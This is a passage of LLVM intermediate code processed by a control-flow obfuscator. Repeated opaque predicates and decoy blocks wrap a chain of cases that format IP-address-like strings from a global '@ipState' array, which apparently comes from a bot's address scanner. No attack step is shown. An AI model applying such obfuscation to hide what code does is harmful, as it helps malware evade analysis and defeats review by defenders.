  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %150

; <label>:150:                                    ; preds = %originalBBpart212, %124
  %151 = load i32, i32* @x.63
  %152 = load i32, i32* @y.64
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %150
  %159 = load i32, i32* %1, align 4
  %160 = icmp eq i32 %159, 7
  %161 = load i32, i32* @x.63
  %162 = load i32, i32* @y.64
  %163 = sub i32 %161, 1
  %164 = mul i32 %161, %163
  %165 = urem i32 %164, 2
  %166 = icmp eq i32 %165, 0
  %167 = icmp slt i32 %162, 10
  %168 = or i1 %166, %167
  br i1 %168, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %160, label %169, label %176

; <label>:169:                                    ; preds = %originalBBpart216
  %170 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %171 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %172 = zext i8 %171 to i32
  %173 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %174 = zext i8 %173 to i32
  %175 = call i32 (i8*, i8*, ...) @szprintf(i8* %170, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.648, i32 0, i32 0), i32 %172, i32 %174)
  br label %176

; <label>:176:                                    ; preds = %169, %originalBBpart216
  %177 = load i32, i32* @x.63
  %178 = load i32, i32* @y.64
  %179 = sub i32 %177, 1
  %180 = mul i32 %177, %179
  %181 = urem i32 %180, 2
  %182 = icmp eq i32 %181, 0
  %183 = icmp slt i32 %178, 10
  %184 = or i1 %182, %183
  br i1 %184, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %176
  %185 = load i32, i32* %1, align 4
  %186 = icmp eq i32 %185, 8
  %187 = load i32, i32* @x.63
  %188 = load i32, i32* @y.64
  %189 = sub i32 %187, 1
  %190 = mul i32 %187, %189
  %191 = urem i32 %190, 2
  %192 = icmp eq i32 %191, 0
  %193 = icmp slt i32 %188, 10
  %194 = or i1 %192, %193
  br i1 %194, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %186, label %195, label %218

; <label>:195:                                    ; preds = %originalBBpart220
  %196 = load i32, i32* @x.63
  %197 = load i32, i32* @y.64
  %198 = sub i32 %196, 1
  %199 = mul i32 %196, %198
  %200 = urem i32 %199, 2
  %201 = icmp eq i32 %200, 0
  %202 = icmp slt i32 %197, 10
  %203 = or i1 %201, %202
  br i1 %203, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %195
  %204 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %205 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %206 = zext i8 %205 to i32
  %207 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %208 = zext i8 %207 to i32
  %209 = call i32 (i8*, i8*, ...) @szprintf(i8* %204, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.649, i32 0, i32 0), i32 %206, i32 %208)
  %210 = load i32, i32* @x.63
  %211 = load i32, i32* @y.64
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %218

; <label>:218:                                    ; preds = %originalBBpart224, %originalBBpart220
  %219 = load i32, i32* %1, align 4
  %220 = icmp eq i32 %219, 9
  br i1 %220, label %221, label %228

; <label>:221:                                    ; preds = %218
  %222 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %223 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %224 = zext i8 %223 to i32
  %225 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %226 = zext i8 %225 to i32
  %227 = call i32 (i8*, i8*, ...) @szprintf(i8* %222, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.650, i32 0, i32 0), i32 %224, i32 %226)
  br label %228

; <label>:228:                                    ; preds = %221, %218
  %229 = load i32, i32* %1, align 4
  %230 = icmp eq i32 %229, 10
  br i1 %230, label %231, label %238

; <label>:231:                                    ; preds = %228
  %232 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %233 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %234 = zext i8 %233 to i32
  %235 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %236 = zext i8 %235 to i32
  %237 = call i32 (i8*, i8*, ...) @szprintf(i8* %232, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.651, i32 0, i32 0), i32 %234, i32 %236)
  br label %238

; <label>:238:                                    ; preds = %231, %228
  %239 = load i32, i32* @x.63
  %240 = load i32, i32* @y.64
  %241 = sub i32 %239, 1
  %242 = mul i32 %239, %241
  %243 = urem i32 %242, 2
  %244 = icmp eq i32 %243, 0
  %245 = icmp slt i32 %240, 10
  %246 = or i1 %244, %245
  br i1 %246, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %238
  %247 = load i32, i32* %1, align 4
  %248 = icmp eq i32 %247, 11
  %249 = load i32, i32* @x.63
  %250 = load i32, i32* @y.64
  %251 = sub i32 %249, 1
  %252 = mul i32 %249, %251
  %253 = urem i32 %252, 2
  %254 = icmp eq i32 %253, 0
  %255 = icmp slt i32 %250, 10
  %256 = or i1 %254, %255
  br i1 %256, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %248, label %257, label %280

; <label>:257:                                    ; preds = %originalBBpart228
  %258 = load i32, i32* @x.63
  %259 = load i32, i32* @y.64
  %260 = sub i32 %258, 1
  %261 = mul i32 %258, %260
  %262 = urem i32 %261, 2
  %263 = icmp eq i32 %262, 0
  %264 = icmp slt i32 %259, 10
  %265 = or i1 %263, %264
  br i1 %265, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %257
  %266 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %267 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %268 = zext i8 %267 to i32
  %269 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %270 = zext i8 %269 to i32
  %271 = call i32 (i8*, i8*, ...) @szprintf(i8* %266, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.652, i32 0, i32 0), i32 %268, i32 %270)
  %272 = load i32, i32* @x.63
  %273 = load i32, i32* @y.64
  %274 = sub i32 %272, 1
  %275 = mul i32 %272, %274
  %276 = urem i32 %275, 2
  %277 = icmp eq i32 %276, 0
  %278 = icmp slt i32 %273, 10
  %279 = or i1 %277, %278
  br i1 %279, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %280

; <label>:280:                                    ; preds = %originalBBpart232, %originalBBpart228
  %281 = load i32, i32* @x.63
  %282 = load i32, i32* @y.64
  %283 = sub i32 %281, 1
  %284 = mul i32 %281, %283
  %285 = urem i32 %284, 2
  %286 = icmp eq i32 %285, 0
  %287 = icmp slt i32 %282, 10
  %288 = or i1 %286, %287
  br i1 %288, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %280
  %289 = load i32, i32* %1, align 4
  %290 = icmp eq i32 %289, 12
  %291 = load i32, i32* @x.63
  %292 = load i32, i32* @y.64
  %293 = sub i32 %291, 1
  %294 = mul i32 %291, %293
  %295 = urem i32 %294, 2
  %296 = icmp eq i32 %295, 0
  %297 = icmp slt i32 %292, 10
  %298 = or i1 %296, %297
  br i1 %298, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %290, label %299, label %306

; <label>:299:                                    ; preds = %originalBBpart236
  %300 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %301 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %302 = zext i8 %301 to i32
  %303 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %304 = zext i8 %303 to i32
  %305 = call i32 (i8*, i8*, ...) @szprintf(i8* %300, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.653, i32 0, i32 0), i32 %302, i32 %304)
  br label %306

; <label>:306:                                    ; preds = %299, %originalBBpart236
  %307 = load i32, i32* %1, align 4
  %308 = icmp eq i32 %307, 13
  br i1 %308, label %309, label %316

; <label>:309:                                    ; preds = %306
  %310 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %311 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %312 = zext i8 %311 to i32
  %313 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %314 = zext i8 %313 to i32
  %315 = call i32 (i8*, i8*, ...) @szprintf(i8* %310, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.654, i32 0, i32 0), i32 %312, i32 %314)
  br label %316

; <label>:316:                                    ; preds = %309, %306
  %317 = load i32, i32* %1, align 4
  %318 = icmp eq i32 %317, 14
  br i1 %318, label %319, label %326

; <label>:319:                                    ; preds = %316
  %320 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %321 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %322 = zext i8 %321 to i32
  %323 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %324 = zext i8 %323 to i32
  %325 = call i32 (i8*, i8*, ...) @szprintf(i8* %320, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.645, i32 0, i32 0), i32 %322, i32 %324)
  br label %326

; <label>:326:                                    ; preds = %319, %316
  %327 = load i32, i32* %1, align 4
  %328 = icmp eq i32 %327, 15
  br i1 %328, label %329, label %336

; <label>:329:                                    ; preds = %326
  %330 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %331 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %332 = zext i8 %331 to i32
  %333 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %334 = zext i8 %333 to i32
  %335 = call i32 (i8*, i8*, ...) @szprintf(i8* %330, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.655, i32 0, i32 0), i32 %332, i32 %334)
  br label %336

; <label>:336:                                    ; preds = %329, %326
  %337 = load i32, i32* %1, align 4
  %338 = icmp eq i32 %337, 16
  br i1 %338, label %339, label %346

; <label>:339:                                    ; preds = %336
  %340 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %341 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %342 = zext i8 %341 to i32
  %343 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %344 = zext i8 %343 to i32
  %345 = call i32 (i8*, i8*, ...) @szprintf(i8* %340, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.656, i32 0, i32 0), i32 %342, i32 %344)
  br label %346

; <label>:346:                                    ; preds = %339, %336
  %347 = load i32, i32* %1, align 4
  %348 = icmp eq i32 %347, 17
  br i1 %348, label %349, label %356

; <label>:349:                                    ; preds = %346
  %350 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %351 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %352 = zext i8 %351 to i32
  %353 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %354 = zext i8 %353 to i32
  %355 = call i32 (i8*, i8*, ...) @szprintf(i8* %350, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.644, i32 0, i32 0), i32 %352, i32 %354)
  br label %356

; <label>:356:                                    ; preds = %349, %346
  %357 = load i32, i32* %1, align 4
  %358 = icmp eq i32 %357, 18
  br i1 %358, label %359, label %382

; <label>:359:                                    ; preds = %356
  %360 = load i32, i32* @x.63
  %361 = load i32, i32* @y.64
  %362 = sub i32 %360, 1
  %363 = mul i32 %360, %362
  %364 = urem i32 %363, 2
  %365 = icmp eq i32 %364, 0
  %366 = icmp slt i32 %361, 10
  %367 = or i1 %365, %366
  br i1 %367, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %359
  %368 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %369 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %370 = zext i8 %369 to i32
  %371 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %372 = zext i8 %371 to i32
  %373 = call i32 (i8*, i8*, ...) @szprintf(i8* %368, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.643, i32 0, i32 0), i32 %370, i32 %372)
  %374 = load i32, i32* @x.63
  %375 = load i32, i32* @y.64
  %376 = sub i32 %374, 1
  %377 = mul i32 %374, %376
  %378 = urem i32 %377, 2
  %379 = icmp eq i32 %378, 0
  %380 = icmp slt i32 %375, 10
  %381 = or i1 %379, %380
  br i1 %381, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %382

; <label>:382:                                    ; preds = %originalBBpart240, %356
  %383 = load i32, i32* %1, align 4
  %384 = icmp eq i32 %383, 19
  br i1 %384, label %385, label %392

; <label>:385:                                    ; preds = %382
  %386 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %387 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %388 = zext i8 %387 to i32
  %389 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %390 = zext i8 %389 to i32
  %391 = call i32 (i8*, i8*, ...) @szprintf(i8* %386, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.642, i32 0, i32 0), i32 %388, i32 %390)
  br label %392

; <label>:392:                                    ; preds = %385, %382
  %393 = load i32, i32* @x.63
  %394 = load i32, i32* @y.64
  %395 = sub i32 %393, 1
  %396 = mul i32 %393, %395
  %397 = urem i32 %396, 2
  %398 = icmp eq i32 %397, 0
  %399 = icmp slt i32 %394, 10
  %400 = or i1 %398, %399
  br i1 %400, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %392
  %401 = load i32, i32* %1, align 4
  %402 = icmp eq i32 %401, 20
  %403 = load i32, i32* @x.63
  %404 = load i32, i32* @y.64
  %405 = sub i32 %403, 1
  %406 = mul i32 %403, %405
  %407 = urem i32 %406, 2
  %408 = icmp eq i32 %407, 0
  %409 = icmp slt i32 %404, 10
  %410 = or i1 %408, %409
  br i1 %410, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %402, label %411, label %418

; <label>:411:                                    ; preds = %originalBBpart244
  %412 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %413 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %414 = zext i8 %413 to i32
  %415 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %416 = zext i8 %415 to i32
  %417 = call i32 (i8*, i8*, ...) @szprintf(i8* %412, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.641, i32 0, i32 0), i32 %414, i32 %416)
  br label %418

; <label>:418:                                    ; preds = %411, %originalBBpart244
  %419 = load i32, i32* %1, align 4
  %420 = icmp eq i32 %419, 21
  br i1 %420, label %421, label %444

; <label>:421:                                    ; preds = %418
  %422 = load i32, i32* @x.63
  %423 = load i32, i32* @y.64
  %424 = sub i32 %422, 1
  %425 = mul i32 %422, %424
  %426 = urem i32 %425, 2
  %427 = icmp eq i32 %426, 0
  %428 = icmp slt i32 %423, 10
  %429 = or i1 %427, %428
  br i1 %429, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %421
  %430 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %431 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %432 = zext i8 %431 to i32
  %433 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %434 = zext i8 %433 to i32
  %435 = call i32 (i8*, i8*, ...) @szprintf(i8* %430, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.657, i32 0, i32 0), i32 %432, i32 %434)
  %436 = load i32, i32* @x.63
  %437 = load i32, i32* @y.64
  %438 = sub i32 %436, 1
  %439 = mul i32 %436, %438
  %440 = urem i32 %439, 2
  %441 = icmp eq i32 %440, 0
  %442 = icmp slt i32 %437, 10
  %443 = or i1 %441, %442
  br i1 %443, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br label %444

; <label>:444:                                    ; preds = %originalBBpart248, %418
  %445 = load i32, i32* %1, align 4
  %446 = icmp eq i32 %445, 22
  br i1 %446, label %447, label %454

; <label>:447:                                    ; preds = %444
  %448 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %449 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %450 = zext i8 %449 to i32
  %451 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %452 = zext i8 %451 to i32
  %453 = call i32 (i8*, i8*, ...) @szprintf(i8* %448, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.658, i32 0, i32 0), i32 %450, i32 %452)
  br label %454

; <label>:454:                                    ; preds = %447, %444
  %455 = load i32, i32* %1, align 4
  %456 = icmp eq i32 %455, 23
  br i1 %456, label %457, label %464

; <label>:457:                                    ; preds = %454
  %458 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %459 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %460 = zext i8 %459 to i32
  %461 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %462 = zext i8 %461 to i32
  %463 = call i32 (i8*, i8*, ...) @szprintf(i8* %458, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.659, i32 0, i32 0), i32 %460, i32 %462)
  br label %464

; <label>:464:                                    ; preds = %457, %454
  %465 = load i32, i32* @x.63
  %466 = load i32, i32* @y.64
  %467 = sub i32 %465, 1
  %468 = mul i32 %465, %467
  %469 = urem i32 %468, 2
  %470 = icmp eq i32 %469, 0
  %471 = icmp slt i32 %466, 10
  %472 = or i1 %470, %471
  br i1 %472, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %464
  %473 = load i32, i32* %1, align 4
  %474 = icmp eq i32 %473, 24
  %475 = load i32, i32* @x.63
  %476 = load i32, i32* @y.64
  %477 = sub i32 %475, 1
  %478 = mul i32 %475, %477
  %479 = urem i32 %478, 2
  %480 = icmp eq i32 %479, 0
  %481 = icmp slt i32 %476, 10
  %482 = or i1 %480, %481
  br i1 %482, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %474, label %483, label %490

; <label>:483:                                    ; preds = %originalBBpart252
  %484 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %485 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %486 = zext i8 %485 to i32
  %487 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %488 = zext i8 %487 to i32
  %489 = call i32 (i8*, i8*, ...) @szprintf(i8* %484, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.660, i32 0, i32 0), i32 %486, i32 %488)
  br label %490

; <label>:490:                                    ; preds = %483, %originalBBpart252
  %491 = load i32, i32* %1, align 4
  %492 = icmp eq i32 %491, 25
  br i1 %492, label %493, label %516

; <label>:493:                                    ; preds = %490
  %494 = load i32, i32* @x.63
  %495 = load i32, i32* @y.64
  %496 = sub i32 %494, 1
  %497 = mul i32 %494, %496
  %498 = urem i32 %497, 2
  %499 = icmp eq i32 %498, 0
  %500 = icmp slt i32 %495, 10
  %501 = or i1 %499, %500
  br i1 %501, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %493
  %502 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %503 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %504 = zext i8 %503 to i32
  %505 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %506 = zext i8 %505 to i32
  %507 = call i32 (i8*, i8*, ...) @szprintf(i8* %502, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.661, i32 0, i32 0), i32 %504, i32 %506)
  %508 = load i32, i32* @x.63
  %509 = load i32, i32* @y.64
  %510 = sub i32 %508, 1
  %511 = mul i32 %508, %510
  %512 = urem i32 %511, 2
  %513 = icmp eq i32 %512, 0
  %514 = icmp slt i32 %509, 10
  %515 = or i1 %513, %514
  br i1 %515, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br label %516

; <label>:516:                                    ; preds = %originalBBpart256, %490
  %517 = load i32, i32* %1, align 4
  %518 = icmp eq i32 %517, 26
  br i1 %518, label %519, label %526

; <label>:519:                                    ; preds = %516
  %520 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %521 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %522 = zext i8 %521 to i32
  %523 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %524 = zext i8 %523 to i32
  %525 = call i32 (i8*, i8*, ...) @szprintf(i8* %520, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.662, i32 0, i32 0), i32 %522, i32 %524)
  br label %526

; <label>:526:                                    ; preds = %519, %516
  %527 = load i32, i32* %1, align 4
  %528 = icmp eq i32 %527, 27
  br i1 %528, label %529, label %552

; <label>:529:                                    ; preds = %526
  %530 = load i32, i32* @x.63
  %531 = load i32, i32* @y.64
  %532 = sub i32 %530, 1
  %533 = mul i32 %530, %532
  %534 = urem i32 %533, 2
  %535 = icmp eq i32 %534, 0
  %536 = icmp slt i32 %531, 10
  %537 = or i1 %535, %536
  br i1 %537, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %529
  %538 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %539 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %540 = zext i8 %539 to i32
  %541 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %542 = zext i8 %541 to i32
  %543 = call i32 (i8*, i8*, ...) @szprintf(i8* %538, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.663, i32 0, i32 0), i32 %540, i32 %542)
  %544 = load i32, i32* @x.63
  %545 = load i32, i32* @y.64
  %546 = sub i32 %544, 1
  %547 = mul i32 %544, %546
  %548 = urem i32 %547, 2
  %549 = icmp eq i32 %548, 0
  %550 = icmp slt i32 %545, 10
  %551 = or i1 %549, %550
  br i1 %551, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %552

; <label>:552:                                    ; preds = %originalBBpart260, %526
  %553 = load i32, i32* %1, align 4
  %554 = icmp eq i32 %553, 28
  br i1 %554, label %555, label %562

; <label>:555:                                    ; preds = %552
  %556 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %557 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %558 = zext i8 %557 to i32
  %559 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %560 = zext i8 %559 to i32
  %561 = call i32 (i8*, i8*, ...) @szprintf(i8* %556, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.664, i32 0, i32 0), i32 %558, i32 %560)
  br label %562

; <label>:562:                                    ; preds = %555, %552
  %563 = load i32, i32* %1, align 4
  %564 = icmp eq i32 %563, 29
  br i1 %564, label %565, label %588

; <label>:565:                                    ; preds = %562
  %566 = load i32, i32* @x.63
  %567 = load i32, i32* @y.64
  %568 = sub i32 %566, 1
  %569 = mul i32 %566, %568
  %570 = urem i32 %569, 2
  %571 = icmp eq i32 %570, 0
  %572 = icmp slt i32 %567, 10
  %573 = or i1 %571, %572
  br i1 %573, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %565
  %574 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %575 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %576 = zext i8 %575 to i32
  %577 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %578 = zext i8 %577 to i32
  %579 = call i32 (i8*, i8*, ...) @szprintf(i8* %574, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.665, i32 0, i32 0), i32 %576, i32 %578)
  %580 = load i32, i32* @x.63
  %581 = load i32, i32* @y.64
  %582 = sub i32 %580, 1
  %583 = mul i32 %580, %582
  %584 = urem i32 %583, 2
  %585 = icmp eq i32 %584, 0
  %586 = icmp slt i32 %581, 10
  %587 = or i1 %585, %586
  br i1 %587, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br label %588

; <label>:588:                                    ; preds = %originalBBpart264, %562
  %589 = load i32, i32* %1, align 4
  %590 = icmp eq i32 %589, 30
  br i1 %590, label %591, label %598

; <label>:591:                                    ; preds = %588
  %592 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %593 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %594 = zext i8 %593 to i32
  %595 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %596 = zext i8 %595 to i32
  %597 = call i32 (i8*, i8*, ...) @szprintf(i8* %592, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.666, i32 0, i32 0), i32 %594, i32 %596)
  br label %598

; <label>:598:                                    ; preds = %591, %588
  %599 = load i32, i32* @x.63
  %600 = load i32, i32* @y.64
  %601 = sub i32 %599, 1
  %602 = mul i32 %599, %601
  %603 = urem i32 %602, 2
  %604 = icmp eq i32 %603, 0
  %605 = icmp slt i32 %600, 10
  %606 = or i1 %604, %605
  br i1 %606, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %598
  %607 = load i32, i32* %1, align 4
  %608 = icmp eq i32 %607, 31
  %609 = load i32, i32* @x.63
  %610 = load i32, i32* @y.64
  %611 = sub i32 %609, 1
  %612 = mul i32 %609, %611
  %613 = urem i32 %612, 2
  %614 = icmp eq i32 %613, 0
  %615 = icmp slt i32 %610, 10
  %616 = or i1 %614, %615
  br i1 %616, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %608, label %617, label %640

; <label>:617:                                    ; preds = %originalBBpart268
  %618 = load i32, i32* @x.63
  %619 = load i32, i32* @y.64
  %620 = sub i32 %618, 1
  %621 = mul i32 %618, %620
  %622 = urem i32 %621, 2
  %623 = icmp eq i32 %622, 0
  %624 = icmp slt i32 %619, 10
  %625 = or i1 %623, %624
  br i1 %625, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %617
  %626 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
